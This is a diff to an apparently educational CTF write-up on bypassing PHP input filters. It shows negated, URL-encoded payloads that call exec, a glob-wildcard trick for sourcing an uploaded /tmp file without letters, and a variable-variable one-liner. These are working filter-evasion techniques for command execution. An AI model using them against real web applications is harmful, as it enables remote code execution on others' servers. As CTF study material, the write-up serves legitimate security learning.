@@ -213,14 +213,44 @@ Using reverse bytes to inject. The negative sign is ~, It's also an operator. In
 
 Reverse the string then reverse again in the payload. 
 
+```
 <?php 
 $a = urlencode(~'exec'); 
 echo $a; 
 $b = urlencode(~'nl /*'); 
 echo $b; 
 //(~%9A%87%9A%9C)((~%91%93%DF%D0%D5)); 
+```
+
+### Level 07. Find the flag with only some words
+In 1 CTF I meet a really special CTF where we use linux glob wildcard
+https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm
+
+For easier to unserstand it is something like this:
+![Screenshot from 2021-05-30 15-36-02](https://user-images.githubusercontent.com/62769629/120097836-d46d0a80-c15c-11eb-9825-ea206db37141.png)
 
 
-Level 07. Some 
+* Can replace 0 More than one arbitrary file
 
+? Can represent any character
+
+[^a] Can be used to determine whether the character in this position is a
+
+[0-9] Can be used to limit the scope
+
+adopt ascii We know the code table , You can see the capital letters @ And [ Between , So we can use [@-[] To represent a capital letter .
+
+Sum up , We can use . /???/????????[@-[] To match /tmp/XXXXXXXXX
+
+So, you can use this to find the flag
+
+### Level 08. Some special 
+Of course there are many more
+Baby PHP:
+https://ctftime.org/writeup/15946
+
+Liveoverflow bash without letter:
+https://www.youtube.com/watch?v=6D1LnMj0Yt0
+
+$a=blag;$a{0}=f;111111111111111111111;?><?=$$a;?>
 
